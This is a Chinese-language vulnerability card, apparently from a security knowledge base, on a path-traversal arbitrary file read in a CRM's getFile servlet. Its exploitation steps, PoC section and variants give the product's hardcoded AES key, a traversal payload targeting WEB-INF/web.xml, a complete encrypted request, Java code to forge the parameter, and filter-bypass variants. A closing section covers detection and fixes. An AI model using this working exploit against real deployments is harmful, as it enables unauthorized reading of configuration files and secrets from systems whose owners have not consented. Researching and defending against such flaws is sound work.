---
id: web-generic-file-inclusion-crm-getfile-filename-folder-traversal
title: CRM getFile 接口 fileName 与 folder/sCorpName 拼接导致路径穿越任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: crm-getfile-filename-folder-traversal
aliases:
- getFile fileName 路径穿越
- metasoft CRM 任意文件读取
- sCorpName 目录穿越
- WEB-INF web.xml 读取
tags:
- java
- path-traversal
- file-read
- servlet
- aes
- crm
- web
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T09:12:56+08:00'
  notes: 已对照原文及17张图核对：图09/11 getFile 取 p 参数经 AesEcbCipher.decrypt 后 JSONObject.parseObject；图12 AesEcbCipher SECRET_KEY=metacrmloginpass、AES/ECB/PKCS5Padding、Encrypt 返回 Hex.encodeHexStr；图16 按 folder 选 Path.get*AbsoluteDirectory(sCorpName)，随后 path=path+fileName 并 new FileInputStream+IOUtils.copyLarge 回显；图17 给出 fileName=../../../WEB-INF/web.xml 的 JSON 与完整 p。原文未附读取响应截图，卡内 confidence medium 恰当。原文无产品版本，未设 affected_versions。PoC 未在本机执行。
---

## 一句话结论

CRM 的 `getFile` Servlet 把 AES 解密后的 JSON 中 `fileName` 直接拼接到由 `folder`/`sCorpName` 选出的基础目录后交给 `FileInputStream`，未做规范化或白名单；构造 `fileName=../../../WEB-INF/web.xml` 即可读取 Web 应用任意文件。

## 原理

- **入口**：`getFile.doPost()` 取 `p` 参数 → `AesEcbCipher.decrypt(p)` → `JSONObject.parseObject(dec)`，从 JSON 中读 `fileName`、`folder`、`sCorpName`（该 JSON 解析本身还受 fastjson 1.2.4 反序列化影响，见关联）。
- **目录选择**：`folder` 为 `attach/template/userlogo/messageserv/picture/skinbackground/icon` 之一时，分别调用 `Path.getAttachAbsoluteDirectory(sCorpName)` 等得到基础目录，否则落到临时目录。
- **危险拼接**：`path = path + fileName;`，随后 `new FileInputStream(new File(path))` 并 `IOUtils.copyLarge(fio, response.getOutputStream())` 回显。`fileName` 可含 `../`，`File`/`FileInputStream` 在打开时做路径规范化，于是可跳出基础目录。
- **前置加密**：`p` 是 AES/ECB/PKCS5Padding 加密后的十六进制字符串，密钥硬编码为 `metacrmloginpass`（见 `AesEcbCipher`）；攻击者只要复现该加密即可构造任意 JSON。该加密层不构成安全边界。
- **为什么能读**：基础目录 + `../../../WEB-INF/web.xml` 最终解析为 Web 应用目录下的 `WEB-INF/web.xml`；`FileInputStream` 以 Web 进程权限读取，`IOUtils.copyLarge` 把内容写回响应。
- **原文验证边界**：文章给出完整请求示例与可读目标（`../../../WEB-INF/web.xml`），但未附响应截图；代码路径明确，confidence 定为 medium。

## 触发条件

- 目标部署该 CRM，`getFile` Servlet 可访问（web.xml 中映射）。
- 攻击者知道/能推出 AES 密钥与算法（源码/反编译 jar 中硬编码 `metacrmloginpass`，AES/ECB/PKCS5Padding，十六进制输出）。
- `fileName` 可含 `../`，且 Web 进程对目标文件有读权限（`WEB-INF/web.xml`、配置文件、密钥、日志等）。
- 无 WAF/过滤拦截 `../` 或加密参数；`folder` 取值合法即可进入对应基础目录。

## 利用步骤

1. 从源码/反编译结果确认 `AesEcbCipher` 密钥 `metacrmloginpass`、算法 `AES/ECB/PKCS5Padding`、输出为 hex。
2. 构造 JSON：`{"fileName":"../../../WEB-INF/web.xml","folder":"attach","sCorpName":"test"}`。
3. 用 AES/ECB/PKCS5Padding + 固定密钥加密，hex 编码得到 `p`。
4. 发送 `GET /getFile?p=<hex>`；响应体即目标文件内容（`Content-Type` 可能为 text/html）。
5. 按需调整 `../` 层数与 `folder`，读取数据库配置、`WEB-INF/classes`、日志、密钥文件等。

## PoC

明文 JSON：

```json
{"fileName":"../../../WEB-INF/web.xml","folder":"attach","sCorpName":"test"}
```

请求（原文示例，p 为加密后的 hex）：

```http
GET /getFile?p=1CF37E2128AD2E6A9C764BFA64F4DFC05AEA346E3B64964870E84D3534FB311E19EFC63CEA5C685FB811040E0A6266E50F44D3CC1C4294FAE56ED47A95F9ADB61A3CC792F6EE3CBC3A3045C0CEE19D0C760C424751196BBA8492DC5D0A56B87E HTTP/1.1
Host: target
```

加密伪代码（与 `AesEcbCipher` 对应）：

```java
Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec("metacrmloginpass".getBytes(), "AES"));
String p = Hex.encodeHexStr(c.doFinal(json.getBytes("UTF-8")));
```

## 变体与关联

- **目录选择变体**：`folder=template/userlogo/picture/...` 对应不同基础目录，穿越到 Web 根/系统目录的层数随之调整；`sCorpName` 也可影响基础路径。
- **Windows 部署**：使用 `..\..\` 或混合分隔符；Java `File` 在 Windows 同时接受 `/` 与 `\`。
- **编码绕过**：若存在简单过滤，可用 URL 编码、双重编码、`....//` 等变体（取决于解码顺序）。
- **同一入口的 fastjson RCE**：`p` 解密后直接 `JSONObject.parseObject`，且 fastjson 1.2.4 存在 AutoType/JNDI 链；文件读取与反序列化可分别利用，见关联 fastjson 卡片。
- **关联**：Java `new File(root, path)`/字符串拼接下载读取、Windows 反斜杠穿越、Token 下载接口路径穿越等卡片。

## 检测与防御

- **修复**：对 `fileName` 只取 `basename` 并做字符白名单；`base = new File(root).getCanonicalFile()`，拼接后 `getCanonicalPath()` 必须以 `base + File.separator` 开头；或只接受文件 ID/白名单映射。
- **鉴权**：下载接口增加登录与文件归属校验，禁止读取 `WEB-INF`、配置、日志目录。
- **检测**：请求 `p` 解密后 JSON 含 `../`、`..\\`、`WEB-INF`、`/etc/passwd` 等；`getFile` 响应体出现 XML/配置内容；同一下载接口短时间读取多个非业务路径。
- **防御**：Web 进程低权限运行；敏感文件权限最小化；WAF 对解密后的参数做路径规范化检查（需能解密或由应用层检测）；密钥不要硬编码在可获取的 jar 中。
